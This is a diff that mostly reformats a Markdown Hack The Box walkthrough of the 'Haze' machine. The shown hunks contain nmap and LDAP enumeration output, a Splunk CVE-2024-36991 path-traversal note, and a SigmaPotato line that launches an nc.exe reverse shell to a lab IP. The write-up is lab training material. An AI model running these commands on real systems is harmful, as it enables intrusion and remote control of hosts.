@@ -40,7 +40,6 @@ Compromise begins with `paul.taylor` using **Splunk 9.2.1 Directory Traversal (C
 ## Nmap
 
 ```bash
-
 # Nmap 7.95 scan initiated Sat Jul  5 21:03:44 2025 as: /usr/lib/nmap/nmap -sVC --version-all -T4 -Pn -vv -oA ./nmap/full_tcp_scan -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,8000,8088,8089,9389,47001,49664,49665,49666,49667,49668,54347,56094,56096,56098,56113,56124,56142,56207, 10.10.11.61
 Nmap scan report for 10.10.11.61
 Host is up, received user-set (0.084s latency).
@@ -346,7 +345,6 @@ Host script results:
 
 Read data files from: /usr/share/nmap
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-
 # Nmap done at Sat Jul  5 21:05:59 2025 -- 1 IP address (1 host up) scanned in 135.21 seconds
 ```
 
@@ -361,21 +359,13 @@ Requesting  `namingcontexts` from base
 ```bash
 ┌──(bravosec㉿fsociety)-[~/htb/Haze]
 └─$ ldapsearch -H "ldap://$(pt get rhost)" -x -s base namingcontexts | tee enum/ldapsearch_namingcontexts.txt
-
 # extended LDIF
-
 #
-
 # LDAPv3
-
 # base <> (default) with scope baseObject
-
 # filter: (objectclass=*)
-
 # requesting: namingcontexts
-
 #
-
 
 #
 dn:
@@ -385,14 +375,11 @@ namingcontexts: CN=Schema,CN=Configuration,DC=haze,DC=htb
 namingcontexts: DC=DomainDnsZones,DC=haze,DC=htb
 namingcontexts: DC=ForestDnsZones,DC=haze,DC=htb
 
-
 # search result
 search: 2
 result: 0 Success
 
-
 # numResponses: 2
-
 # numEntries: 1
 ```
 
@@ -403,28 +390,19 @@ Check if anonymous binding is enabled while enumerating user objects
 ```bash
 ┌──(bravosec㉿fsociety)-[~/htb/Haze]
 └─$ BASE="$(cat enum/ldapsearch_namingcontexts.txt | grep 'namingcontexts:' | head -n +1 | awk -F': ' '{print $2}')"; ldapsearch -H "ldap://$(pt get rhost)" -x -b "${BASE}" '(objectClass=user)' | tee enum/ldapsearch_users.txt
-
 # extended LDIF
-
 #
-
 # LDAPv3
-
 # base <DC=haze,DC=htb> with scope subtree
-
 # filter: (objectClass=user)
-
 # requesting: ALL
-
 #
-
 
 # search result
 search: 2
 result: 1 Operations error
 text: 000004DC: LdapErr: DSID-0C090CAF, comment: In order to perform this opera
  tion a successful bind must be completed on the connection., data 0, v4f7c
-
 
 # numResponses: 1
 ```
@@ -684,6 +662,7 @@ SMB         DC01.haze.htb   445    DC01             [*] Windows Server 2022 Buil
 > POC - https://github.com/jaytiwari05/CVE-2024-36991
 
 > **CVE-2024-36991**
+> 
 > In Splunk Enterprise on Windows versions below **9.2.2**, **9.1.5**, and **9.0.10**, an attacker could perform a path traversal on the `/modules/messaging/` endpoint in Splunk Enterprise on Windows. This vulnerability should only affect Splunk Enterprise on Windows.
 {: .prompt-info }
 
@@ -1595,6 +1574,7 @@ Change `ms-DS-GroupMSAMembership` attribute on `Haze-IT-Backup$` account
 ```
 
 > **Alternative method**
+> 
 > From powershell with default AD module
 > 
 > ```powershell
@@ -2202,7 +2182,7 @@ False  v4.0.30319
 [C:\Windows\system32]: [SigmaPotato]::Main("\programdata\nc.exe -e cmd.exe 10.10.14.66 1111")
 ```
 
-> We can't get current user info since the tokens weren't fully impersonated, but we can create schedule tasks or services to run a new reverse shell as `NT Authority SYSTEM
+> We can't get current user info since the tokens weren't fully impersonated, but we can create schedule tasks or services to run a new reverse shell as `NT Authority SYSTEM`
 {: .prompt-info }
 
 ```bash
